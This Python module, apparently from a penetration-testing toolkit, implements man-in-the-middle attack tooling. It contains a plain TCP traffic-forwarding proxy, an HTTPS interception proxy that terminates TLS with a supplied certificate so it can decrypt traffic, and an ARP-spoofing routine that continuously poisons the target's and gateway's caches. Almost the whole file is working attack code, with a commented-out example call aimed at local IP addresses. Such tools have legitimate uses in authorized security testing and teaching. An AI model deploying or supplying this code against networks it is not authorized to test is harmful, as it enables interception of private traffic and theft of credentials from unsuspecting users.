"""
modules/pentesting_tools/mitm_tools.py

Implements tools and techniques for Man-In-The-Middle (MITM) attacks and analysis.
"""

import socket
import ssl
import threading
from typing import Optional, Tuple


class MITMProxy:
    """
    A class to set up a basic MITM proxy for intercepting traffic.
    """

    def __init__(self, listen_address: str, listen_port: int, forward_address: str, forward_port: int):
        """
        Initializes the MITM proxy settings.
        :param listen_address: Address to listen on.
        :param listen_port: Port to listen on.
        :param forward_address: Target server address to forward traffic.
        :param forward_port: Target server port to forward traffic.
        """
        self.listen_address = listen_address
        self.listen_port = listen_port
        self.forward_address = forward_address
        self.forward_port = forward_port

    def start_proxy(self):
        """
        Starts the MITM proxy server.
        """
        print(f"Starting MITM proxy on {self.listen_address}:{self.listen_port}")
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.bind((self.listen_address, self.listen_port))
            server_socket.listen(5)
            print("MITM Proxy is running... Waiting for connections.")
            while True:
                client_socket, client_address = server_socket.accept()
                print(f"Connection established with {client_address}")
                thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket,)
                )
                thread.start()
        except Exception as e:
            print(f"Error starting MITM proxy: {e}")

    def handle_client(self, client_socket: socket.socket):
        """
        Handles incoming client connections and forwards traffic to the target server.
        :param client_socket: The client socket.
        """
        try:
            target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_socket.connect((self.forward_address, self.forward_port))

            # Start bi-directional traffic forwarding
            threading.Thread(target=self.forward_traffic, args=(client_socket, target_socket)).start()
            threading.Thread(target=self.forward_traffic, args=(target_socket, client_socket)).start()
        except Exception as e:
            print(f"Error handling client connection: {e}")

    def forward_traffic(self, source_socket: socket.socket, destination_socket: socket.socket):
        """
        Forwards traffic between the source and destination sockets.
        :param source_socket: The source socket.
        :param destination_socket: The destination socket.
        """
        try:
            while True:
                data = source_socket.recv(4096)
                if not data:
                    break
                destination_socket.send(data)
        except Exception as e:
            print(f"Error forwarding traffic: {e}")
        finally:
            source_socket.close()
            destination_socket.close()


class HTTPSMITMProxy(MITMProxy):
    """
    Extends the MITM proxy to handle HTTPS traffic using SSL interception.
    """

    def __init__(
        self,
        listen_address: str,
        listen_port: int,
        forward_address: str,
        forward_port: int,
        certfile: str,
        keyfile: str
    ):
        """
        Initializes the HTTPS MITM proxy settings.
        :param listen_address: Address to listen on.
        :param listen_port: Port to listen on.
        :param forward_address: Target server address to forward traffic.
        :param forward_port: Target server port to forward traffic.
        :param certfile: Path to the SSL certificate file.
        :param keyfile: Path to the SSL key file.
        """
        super().__init__(listen_address, listen_port, forward_address, forward_port)
        self.certfile = certfile
        self.keyfile = keyfile

    def handle_client(self, client_socket: socket.socket):
        """
        Handles incoming HTTPS client connections and decrypts traffic for inspection.
        :param client_socket: The client socket.
        """
        try:
            ssl_client_socket = ssl.wrap_socket(
                client_socket,
                server_side=True,
                certfile=self.certfile,
                keyfile=self.keyfile
            )
            target_socket = socket.create_connection((self.forward_address, self.forward_port))
            ssl_target_socket = ssl.wrap_socket(target_socket)

            # Start bi-directional traffic forwarding
            threading.Thread(target=self.forward_traffic, args=(ssl_client_socket, ssl_target_socket)).start()
            threading.Thread(target=self.forward_traffic, args=(ssl_target_socket, ssl_client_socket)).start()
        except Exception as e:
            print(f"Error handling HTTPS client connection: {e}")


def perform_arp_spoofing(target_ip: str, gateway_ip: str, interface: Optional[str] = None):
    """
    Performs ARP spoofing to intercept network traffic.
    :param target_ip: IP address of the target.
    :param gateway_ip: IP address of the gateway.
    :param interface: Network interface to use (optional).
    """
    try:
        from scapy.all import ARP, send
        print(f"Starting ARP spoofing on target: {target_ip} via gateway: {gateway_ip}")
        target_arp = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
        gateway_arp = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)
        while True:
            send(target_arp, verbose=False)
            send(gateway_arp, verbose=False)
    except Exception as e:
        print(f"Error performing ARP spoofing: {e}")


if __name__ == "__main__":
    # Example Usage
    proxy = MITMProxy("0.0.0.0", 8080, "example.com", 80)
    threading.Thread(target=proxy.start_proxy).start()

    https_proxy = HTTPSMITMProxy(
        "0.0.0.0",
        8443,
        "example.com",
        443,
        certfile="path/to/certfile.pem",
        keyfile="path/to/keyfile.pem"
    )
    threading.Thread(target=https_proxy.start_proxy).start()

    # Example ARP spoofing
    # Uncomment the following line to perform ARP spoofing (use responsibly and ethically)
    # perform_arp_spoofing("192.168.1.100", "192.168.1.1")
